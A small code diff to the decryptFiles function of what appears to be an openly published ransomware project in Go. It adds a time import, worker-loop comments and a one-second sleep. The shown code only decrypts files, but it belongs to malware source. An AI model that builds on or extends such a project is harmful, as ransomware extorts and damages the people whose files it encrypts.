@@ -6,6 +6,7 @@ import (
 	"log"
 	"os"
 	"path/filepath"
+	"time"
 
 	"github.com/mauri870/cryptofile/crypto"
 	"github.com/mauri870/ransomware/cmd"
@@ -76,6 +77,8 @@ func decryptFiles(key string) {
 		close(cmd.MatchedFiles)
 	}()
 
+	// Process file that are sended to channel
+	// Launch NumWorker for handle files
 	for i := 0; i < cmd.NumWorkers; i++ {
 		go func() {
 			for {
@@ -119,4 +122,5 @@ func decryptFiles(key string) {
 	}
 
 	<-cmd.Done
+	time.Sleep(time.Second)
 }
